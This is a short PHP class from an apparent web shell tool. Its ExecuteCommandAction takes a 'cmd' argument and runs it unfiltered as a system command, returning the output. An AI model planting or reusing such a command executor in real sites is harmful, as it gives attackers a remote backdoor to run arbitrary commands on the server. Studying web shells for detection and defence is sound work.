<?php
namespace WebShell;

class ExecuteCommandAction implements Action
{
    public function run(object $args): string
    {
        // Extract the command from the arguments
        $cmd = $args->cmd;

        // Run the command
        $output = SystemService::getInstance()->execute($cmd);

        // Return the command output
        return $output;
    }
}
?>
